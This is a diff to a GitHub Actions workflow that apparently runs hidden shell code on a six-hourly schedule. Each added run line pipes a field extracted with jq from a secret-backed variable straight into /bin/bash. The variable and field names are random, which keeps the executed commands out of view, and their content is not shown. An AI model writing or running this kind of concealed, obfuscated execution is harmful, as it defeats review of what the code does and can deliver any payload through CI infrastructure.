@@ -1,21 +1,29 @@
 name: caiweiccc
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
+    - cron: '11 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caiweiccc
         env:
-          h5667: ${{ secrets.h5667 }}
+          cfdg73543: ${{ secrets.cfdg73543 }}
         run: |
-          echo $h5667 | jq -r .cj10 | /bin/bash
-          echo $uon12 | jq -r .rqfeg39 | /bin/bash
-          echo $dv39504 | jq -r .pznw0 | /bin/bash
-          echo $ctds137 | jq -r .mgh23 | /bin/bash
-          echo $zvq99921 | jq -r .opzf884 | /bin/bash
+          echo $cfdg73543 | jq -r .vmfdt7 | /bin/bash
+          echo $unqr05 | jq -r .dlkn9662 | /bin/bash
+          echo $qqcu34 | jq -r .uqtt9574 | /bin/bash
+          echo $gtpmd698 | jq -r .djxl685 | /bin/bash
+          echo $wq06526 | jq -r .n903 | /bin/bash
+          echo $qbix9 | jq -r .zu84 | /bin/bash
+          echo $xc07358 | jq -r .izg08037 | /bin/bash
+          echo $egp186 | jq -r .nhpi78 | /bin/bash
+          echo $tny319 | jq -r .vvm3 | /bin/bash
+          echo $gcct4355 | jq -r .v24575 | /bin/bash
+          echo $gcobb83060 | jq -r .zlh7636 | /bin/bash
+          echo $cvarj3611 | jq -r .lj822 | /bin/bash
+          echo $ddcpc7035 | jq -r .zgkqp53 | /bin/bash
 
